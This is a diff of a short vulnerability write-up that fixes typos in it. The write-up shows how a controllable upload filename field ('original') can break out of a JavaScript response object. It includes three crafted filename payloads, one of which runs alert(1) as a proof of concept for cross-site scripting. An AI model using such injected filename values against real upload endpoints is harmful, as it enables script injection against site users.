@@ -12,7 +12,7 @@ client js code as :
 ```javascript
   {'original':'008.jpg','url':'http://hikerell.cn/getFile/20141103141947:42d3db16e960a621f5e85d456f2054ae.jpg','title':'','state':'SUCCESS'}
 ```
-the "original" could be controled, then wen can submit "original" using the value:
+the "original" could be controled, then we can submit "original" using the value:
 ```
   fake.jpg','url':'fakeurl','title':'faketitle','state':'SUCCESS'})//{'name':'008.jpg"
 ```  
@@ -20,7 +20,7 @@ the "original" could be controled, then wen can submit "original" using the valu
 ```
   fake.jpg','url':'fakeurl','title':'faketitle','state':'SUCCESS'})<!--{'name':'008.jpg"
 ```
-  or. execute js directly:
+  or. execute js code directly:
 ```
   fake.jpg','url':'fakeurl','title':'faketitle','state':'SUCCESS'})(alert(1))<!--{'name':'008.jpg"
 ```
